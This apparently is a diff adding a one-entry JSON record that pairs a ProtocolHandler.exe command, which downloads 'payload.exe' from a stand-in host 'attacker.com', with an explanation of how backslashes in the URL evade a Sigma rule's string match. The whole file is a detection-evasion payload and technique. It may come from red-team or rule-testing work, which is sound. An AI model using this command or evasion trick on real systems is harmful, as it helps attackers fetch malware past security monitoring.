@@ -1,0 +1,6 @@
+[
+  {
+    "output": "ProtocolHandler.exe \"http:\\\\attacker.com\\payload.exe\"",
+    "explanation": "The Sigma rule checks for the exact protocol strings 'http://', 'https://', or 'ftp://'. By substituting the forward slashes with backslashes (e.g., 'http:\\\\'), the Windows URL parser will still normalize the URI and successfully download the payload, while evading the rule's specific command-line string matching."
+  }
+]
